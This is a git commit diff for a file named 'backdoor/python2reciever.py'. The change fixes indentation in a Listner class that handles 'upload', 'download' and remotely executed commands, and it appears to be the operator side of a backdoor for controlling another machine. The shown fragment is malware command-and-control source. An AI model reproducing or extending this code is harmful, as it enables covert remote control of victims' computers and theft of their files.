f0c8d9bb7768227ae3bbd2738eebe92c93761987
Akshaythulasidharan <akshaythulasidharan@gmail.com>
2020-04-14 16:02:38 -0400

    error

--- backdoor/python2reciever.py
+++ backdoor/python2reciever.py
@@ -50,12 +50,10 @@ class Listner:
             command = command.split(" ")
 
             try:
-               if command[0] == "upload":
+                if command[0] == "upload":
                     file_content = self.read_file(command[1])
                     command.append(file_content)
-
                 result = self.execute_remotely(command)
-
                 if command[0] == "download" and "[-] Error" not in result:
                     result = self.write_file(command[1],result)
             except Exception:
